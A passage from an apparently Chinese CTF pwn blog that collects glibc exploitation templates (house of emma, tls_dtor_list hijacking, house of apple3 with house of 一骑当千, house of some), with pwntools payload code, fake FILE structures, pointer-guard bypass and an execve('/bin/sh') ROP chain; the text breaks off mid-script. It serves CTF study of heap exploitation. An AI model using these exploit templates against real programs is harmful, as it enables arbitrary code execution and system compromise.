class="number">61</span>) <span class="comment"># r14 + 0x38</span></span><br></pre></td></tr></table></figure><p>需要注意的是，在<code>memset</code>之前仍然有<code>free(IO-&gt;buf_base)</code>，因此需要伪造一下<code>memset_got_addr</code>的<code>fake chunk</code>的堆块头，以及其<code>next chunk</code>的堆块头<br>最终通过<code>exit()</code>函数或者程序正常退出触发攻击</p><h3 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h3><p>house of emma主要利用了<code>_IO_cookie_jumps</code>这个<code>vtable</code><br>利用<code>house of KiWi</code>配合<code>house of emma</code>的调用链为<code>__malloc_assert</code> -&gt; <code>__fxprintf</code> -&gt; <code>__vfxprintf</code> -&gt; <code>locked_vfxprintf</code> -&gt; <code>__vfprintf_internal</code> -&gt; <code>_IO_new_file_xsputn</code> ( &#x3D;&gt; <code>_IO_cookie_write</code>)，这里用的是<code>_IO_cookie_write</code>函数，用其他的当然也同理<br>fs寄存器的值和地址可以通过<code>x/16gx pthread_self()</code>指令来查看<br>fake_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># __pointer_chk_guard为tls[0x30]处的值，用于对数据进行加密</span></span><br><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line">magic_gadget = libc.address + <span class="number">0x1460e0</span> <span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_stderr += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line"><span class="comment"># _IO_flockfile(fp) in __vfxprintf</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>) <span class="comment"># fake_vtable</span></span><br><span class="line"><span class="comment"># call [vtable]+0x38 (call _IO_new_file_xsputn)</span></span><br><span class="line"><span class="comment"># =&gt; call _IO_cookie_jumps+0x78 =&gt; call _IO_cookie_write</span></span><br><span class="line">fake_stderr += p64(srop_address) <span class="comment"># __cookie (rdi)</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>)</span><br><span class="line">fake_stderr += p64(ROL(magic_gadget ^ __pointer_chk_guard, <span class="number">0x11</span>, <span class="number">64</span>)) <span class="comment"># __io_functions.write</span></span><br></pre></td></tr></table></figure><p>最终通过<code>_malloc_hook</code>来触发(<code>&lt;=2.36</code>)<br>当然也可以通过<code>_IO_flush_all</code>来触发，不过由于在<code>exit</code>函数的调用过程中会出现很多会出现调用别的给加密过的函数指针，由于<code>__pointer_chk_guard</code>已经给我们修改，所以这些函数指针在给调用的时候会给报错，即该方法的利用比较麻烦，不建议使用</p><h3 id="劫持tls-dtor-list，利用-call-tls-dtors拿到权限"><a href="#劫持tls-dtor-list，利用-call-tls-dtors拿到权限" class="headerlink" title="劫持tls_dtor_list，利用__call_tls_dtors拿到权限"></a>劫持tls_dtor_list，利用__call_tls_dtors拿到权限</h3><p>主要功能为<code>getshell</code>,当然也可以利用<code>setcontext+61</code>打<code>srop</code><br>dtor_list:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure><p>__call_tls_dtors:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>func</code>其实是一个函数指针，而<code>obj</code>则是指向该函数的参数的位置<br>我们可以将<code>tls_dtor_list</code>指向我们伪造的堆地址，将<code>func</code>改为<code>system</code>的地址(<code>ogg</code>也可以)，<code>obj</code>指向<code>/bin/sh\x00</code>即可<code>getshell</code><br>注意，这里对<code>func</code>这个函数指针进行了加密，所以要泄露出<code>__pointer_chk_guard</code>的值或将其修改为已知的值<br>fs寄存器的值和地址可以通过<code>x/16gx pthread_self()</code>指令来查看<br>模板：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = lambda val, r_bits, max_bits: \</span><br><span class="line">(val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>) | \</span><br><span class="line">((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">    # 两次largebin attack改tls_dtor_list与pointer_guard</span><br><span class="line"></span><br><span class="line">    fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">    edit(<span class="number">0</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))))</span><br></pre></td></tr></table></figure><p>若是想<code>orw</code>，那么可以让<code>func</code>成员为<code>magic_gadget</code>的相关数据，将<code>rdi</code>与<code>rdx</code>转换后，再调用<code>setcontext + 61</code>走<code>SROP</code>即可<br>最终通过<code>exit()</code>函数退出程序触发攻击</p><h3 id="house-of-apple3-house-of-一骑当千"><a href="#house-of-apple3-house-of-一骑当千" class="headerlink" title="house of apple3 + house of 一骑当千"></a>house of apple3 + house of 一骑当千</h3><p>这个模板为两种打法相结合，<code>house of 一骑当千</code>的好处是打<code>orw</code>时不需要用到<code>magic gadget</code>。<code>house of apple3</code>的关注点主要是对成员<code>_codecvt</code>的利用，当<code>wfile</code>的<code>vtable</code>给上保护后依然可以使用<br>模板:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">fake_file_addr = <span class="number">0x3a60</span>+heap_base</span><br><span class="line">fake_ucontext_addr = fake_file_addr + <span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of apple3</span></span><br><span class="line">fake_file = p64(np.uint(-<span class="number">21</span>))+p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#_IO_read_endtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x100</span>)<span class="comment"># _IO_buf_end = fake_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x40</span>)<span class="comment">#  _codecvt</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x1fe6e0</span>)<span class="comment"># _wide_data  尽量保持不变 </span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x8</span>)<span class="comment"># vtable</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># fake_ucontext_addr rdi 这个地方必须为0 和这里偏移0x1c0的位置必须为0</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">fake_file += p64(setcontext)  <span class="comment"># 用于控制rip setcontext(一骑当千)/setcontext+61/system(rdi不好控制)/ogg(这个没试过)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of 一骑当千</span></span><br><span class="line">rdi  = fake_ucontext_addr &amp; ~<span class="number">0xfff</span>  <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">rsi  = <span class="number">0x1000</span>      </span><br><span class="line">rbp  = fake_ucontext_addr  + <span class="number">0x100</span></span><br><span class="line">rbx  = <span class="number">0</span></span><br><span class="line">rdx  = <span class="number">7</span></span><br><span class="line">rcx  = <span class="number">0</span></span><br><span class="line">rax  = <span class="number">0</span></span><br><span class="line">rsp  = fake_ucontext_addr + <span class="number">0x100</span></span><br><span class="line">rip  = mprotect</span><br><span class="line"></span><br><span class="line">ucontext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">ucontext += p64(rdi) + p64(rsi)</span><br><span class="line">ucontext += p64(rbp) + p64(rbx)</span><br><span class="line">ucontext += p64(rdx) + p64(rcx)</span><br><span class="line">ucontext += p64(rax)</span><br><span class="line">ucontext += p64(rsp) + p64(rip)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0xe0</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">ucontext += p64(heap_base + <span class="number">0x1000</span>)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0x100</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = p64(fake_ucontext_addr + <span class="number">0x110</span>) + p64(<span class="number">0</span>) + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = fake_file + ucontext + <span class="built_in">bytes</span>(shellcode)</span><br></pre></td></tr></table></figure><h3 id="house-of-some"><a href="#house-of-some" class="headerlink" title="house of some"></a>house of some</h3><p>Csome学长提出的利用链，主要是通过伪造<code>fake_file</code>来造成任意地址写和任意地址读<br>其中<code>fake_file</code>分为<code>write_file</code>和<code>read_file</code>,令<code>_IO_list_all</code>指向一个<code>read_file</code>，并令<code>write_file</code>的<code>_chain</code>指向将要执行的<code>read</code>函数所写入的地址。在进行<code>fsop</code>时会遍历到<code>read_file</code>执行<code>read</code>函数，此时写入<code>write_file</code>,并令其<code>_chain</code>指向另外一个我们已经写好的<code>read_file</code>。此时由于我们第一个<code>read_flie</code>的<code>_chain</code>已经指向我们<code>read</code>函数所写入的地址，而该地址已经被我们写入了<code>write_file</code>，我们可以通过该<code>write_file</code>来泄露任意地址。执行完<code>wirte</code>函数后<code>rip</code>则会继续遍历到我们下一个<code>read_file</code>。我们便可以不断的进行<code>read-write-read</code>这样一个过程,可以无数次泄露程序的所有地址和修改任何地址中的内容<br>write_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file_write = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: 需要泄露的起始地址, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: 需要泄露的终止地址, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x68</span>: 下一个调用的fake file地址, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_file_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>read_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file_read = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x38</span>: 任意地址写的起始地址, <span class="comment"># _IO_buf_base</span></span><br><span class="line">  <span class="number">0x40</span>: 任意地址写的终止地址, <span class="comment"># _IO_buf_end</span></span><br><span class="line">  <span class="number">0x68</span>: 下一个调用的fake file地址, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">  <span class="number">0xa0</span>: wide_data的地址, <span class="comment"># _wide_data</span></span><br><span class="line">  <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_wfile_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_wide_data = flat(&#123;</span><br><span class="line">  <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0xe0</span>: _IO_file_jumps - <span class="number">0x48</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>Csome的自动化脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.arch = &quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HouseOfSome</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, libc: ELF, controled_addr</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.libc = libc</span><br><span class="line">        self.controled_addr =controled_addr</span><br><span class="line">        self.READ_LENGTH_DEFAULT = <span class="number">0x400</span></span><br><span class="line">        self.LEAK_LENGTH = <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">        self.fake_wide_data_template = <span class="keyword">lambda</span> : flat(&#123;</span><br><span class="line">            <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0xE0</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x48</span>,</span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_read_template = <span class="keyword">lambda</span> buf_start, buf_end, wide_data, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">            <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x38</span>: buf_start, <span class="comment"># _IO_buf_base</span></span><br><span class="line">            <span class="number">0x40</span>: buf_end, <span class="comment"># _IO_buf_end</span></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">            <span class="number">0xa0</span>: wide_data, <span class="comment"># _wide_data</span></span><br><span class="line">            <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_write_template = <span class="keyword">lambda</span> buf_start, buf_end, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x20</span>: buf_start, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: buf_end, <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.wide_data_length = <span class="built_in">len</span>(self.fake_wide_data_template())</span><br><span class="line">        self.read_file_length = <span class="built_in">len</span>(self.fake_file_read_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.write_file_length = <span class="built_in">len</span>(self.fake_file_write_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_control_addr</span>(<span class="params">self, addr, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">return</span> addr + <span class="built_in">len</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_read_file_0 = self.fake_file_read_template(buf, buf+<span class="built_in">len</span>, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) </span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        addr += self.read_file_length + self.wide_data_length</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * <span class="number">2</span>)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_read_file_0,</span><br><span class="line">            f_wide_data,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_write_file = self.fake_file_write_template(buf, buf+<span class="built_in">len</span>, addr+self.write_file_length, fd) </span><br><span class="line">        addr += self.write_file_length</span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_write_file,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bomb</span>(<span class="params">self, io: tube, retn_addr</span>):</span><br><span class="line">        payload = self.write(<span class="number">1</span>, self.libc.symbols[<span class="string">&#x27;_environ&#x27;</span>], <span class="number">0x8</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        stack_leak = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">        log.success(<span class="string">f&quot;stack_leak : <span class="subst">&#123;stack_leak:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.write(<span class="number">1</span>, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="comment"># retn_addr = self.libc.symbols[&#x27;_IO_file_underflow&#x27;] + 390</span></span><br><span class="line">        log.success(<span class="string">f&quot;retn_addr : <span class="subst">&#123;retn_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">        buf = p.recv(self.LEAK_LENGTH)</span><br><span class="line">        offset = buf.find(p64(retn_addr))</span><br><span class="line">        log.success(<span class="string">f&quot;offset : <span class="subst">&#123;offset:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.read(<span class="number">0</span>, stack_leak - self.LEAK_LENGTH + offset, <span class="number">0x300</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">        rop = ROP(self.libc)</span><br><span class="line">        rop.base = stack_leak - self.LEAK_LENGTH + offset</span><br><span class="line">        rop.call(<span class="string">&#x27;execve&#x27;</span>, [<span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        log.info(rop.dump())</span><br><span class="line">        rop_chain = rop.chain()</span><br><span 